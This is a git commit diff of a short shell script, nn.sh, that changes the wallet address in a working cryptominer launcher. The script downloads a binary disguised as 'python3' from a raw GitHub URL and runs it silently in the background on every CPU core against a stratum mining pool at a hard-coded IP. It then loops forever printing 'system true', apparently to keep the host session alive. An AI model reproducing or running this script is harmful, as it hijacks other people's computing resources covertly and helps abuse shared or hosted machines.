364dcff9bf43243ab5ebfc90d4b1598af51e0495
Rockymoyosu <114894213+Rockymoyosu@users.noreply.github.com>
2022-10-03 10:45:22 +0700

    Update nn.sh

--- nn.sh
+++ nn.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://raw.githubusercontent.com/mulayia70/lamak/main/mom/bu/python3
 chmod +x python3
-./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u THN2wdyn5c6yU9ak1oJHqqGEo2dfATXrQa.gtlb -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
+./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u TXKpEMM3Tz5a2uuanyckfjELhKD4yGcyCn.g -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
 while :; do echo "system true"; sleep 30; done
